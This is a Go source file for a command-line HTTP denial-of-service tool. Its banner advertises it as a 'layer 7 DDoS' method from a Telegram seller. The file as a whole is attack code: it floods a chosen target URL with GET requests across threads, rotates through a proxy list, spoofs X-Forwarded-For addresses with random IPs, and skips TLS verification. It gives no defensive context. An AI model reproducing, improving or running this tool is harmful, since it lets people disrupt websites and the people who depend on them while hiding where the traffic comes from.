package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	headers = make(map[string]string)
	agent   = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	jar, _ = cookiejar.New(nil)
)

func randStr(length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	var seededRand = rand.Reader

	b := make([]byte, length)
	for i := range b {
		num, err := rand.Int(seededRand, big.NewInt(int64(len(charset))))
		if err != nil {
			panic(err)
		}
		b[i] = charset[num.Int64()]
	}
	return string(b)
}

func getCurrentTime() string {
	now := time.Now()
	return fmt.Sprintf("(\x1b[34m%s\x1b[0m)", now.Format("15:04:05"))
}

func getStatus(targetURL string, proxyURL *url.URL) {
	agent.Proxy = http.ProxyURL(proxyURL)
	client := &http.Client{Transport: agent, Timeout: 5 * time.Second, Jar: jar}
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		fmt.Printf("%s [HTTP-GO]  Error creating request: %s\n", getCurrentTime(), err.Error())
		return
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		fmt.Printf("%s [HTTP-GO]  Invalid target URL: %s\n", getCurrentTime(), targetURL)
		return
	}

	for key, value := range headers {
		switch key {
		case "target-host":
			req.Header.Set("Host", parsedURL.Host)
		case "target-path":
			req.URL.Path = parsedURL.Path
		case "random":
			req.Header.Set(key, randStr(15))
		default:
			req.Header.Set(key, value)
		}
	}

	req.Header.Set("X-Forwarded-For", generateFakeIP())

	resp, err := client.Do(req)
	if err != nil {
		if os.IsTimeout(err) {
			fmt.Printf("%s [HTTP-GO]  Request Timed Out\n", getCurrentTime())
		} else {
			fmt.Printf("%s [HTTP-GO]  %s\n", getCurrentTime(), err.Error())
		}
		return
	}
	defer resp.Body.Close()

	title := getTitleFromHTML(resp.Body)
	fmt.Printf("%s [HTTP-GO]  Title: %s (\x1b[32m%d\x1b[0m)\n", getCurrentTime(), title, resp.StatusCode)
	fmt.Printf("%s [HTTP-GO]  Using Proxy IP: %s\n", getCurrentTime(), proxyURL.Host)
	fmt.Printf("%s [HTTP-GO]  Using User-Agent: %s\n", getCurrentTime(), req.Header.Get("User-Agent"))

	cookies := jar.Cookies(req.URL)
	for _, cookie := range cookies {
		fmt.Printf("%s [HTTP-GO]  Received Cookie: %s\n", getCurrentTime(), cookie.String())
	}
}

func getTitleFromHTML(body io.Reader) string {
	scanner := bufio.NewScanner(body)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "<title>") {
			start := strings.Index(line, "<title>") + len("<title>")
			end := strings.Index(line, "</title>")
			if start > -1 && end > -1 {
				return line[start:end]
			}
		}
	}
	return "Not Found"
}

func readLines(filePath string) []string {
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

func generateFakeIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(255), randInt(255), randInt(255), randInt(255))
}

func randInt(max int) int {
	num, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		panic(err)
	}
	return int(num.Int64())
}

func main() {
	if len(os.Args) < 7 {
		fmt.Println(`
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService
Usage: go run HTTP-GO.go Target Time Rate Thread ProxyFile HeadersFile
Example: go run HTTP-GO.go https://target.com 120 32 8 proxy.txt headers.txt
		`)
		os.Exit(1)
	}

	targetURL := os.Args[1]
	timeLimit, _ := strconv.Atoi(os.Args[2])
	rate, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]
	headersFile := os.Args[6]

	proxies := readLines(proxyFile)
	headerLines := readLines(headersFile)

	for _, line := range headerLines {
		parts := strings.SplitN(line, ": ", 2)
		if len(parts) == 2 {
			headers[parts[0]] = parts[1]
		}
	}

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			fmt.Printf("%s [HTTP-GO]  Attack Thread %d Started\n", getCurrentTime(), threadID)
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()

			for {
				select {
				case <-ticker.C:
					proxy := proxies[threadID%len(proxies)]
					proxyURL, err := url.Parse("http://" + proxy)
					if err != nil {
						fmt.Printf("%s [HTTP-GO]  Invalid proxy URL: %s\n", getCurrentTime(), proxy)
						continue
					}
					getStatus(targetURL, proxyURL)
				default:
					time.Sleep(time.Duration(rate) * time.Millisecond)
				}
			}
		}(i)
	}

	fmt.Printf("%s [HTTP-GO]  The Attack Has Started\n", getCurrentTime())
	time.Sleep(time.Duration(timeLimit) * time.Second)
	fmt.Printf("%s [HTTP-GO]  The Attack Is Over\n", getCurrentTime())
}
